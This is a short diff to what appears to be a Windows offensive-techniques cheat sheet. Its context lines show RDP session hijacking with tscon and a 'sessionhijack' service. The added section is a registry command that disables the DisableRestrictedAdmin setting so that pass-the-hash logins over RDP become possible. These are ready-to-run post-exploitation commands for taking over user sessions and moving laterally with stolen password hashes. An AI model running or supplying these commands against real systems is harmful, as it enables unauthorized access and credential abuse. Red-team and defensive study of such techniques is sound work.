@@ -32,3 +32,8 @@ tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
 ```
 net start sessionhijack
 ```
+
+## Enable Restricted Admin mode to allow Pth
+```
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
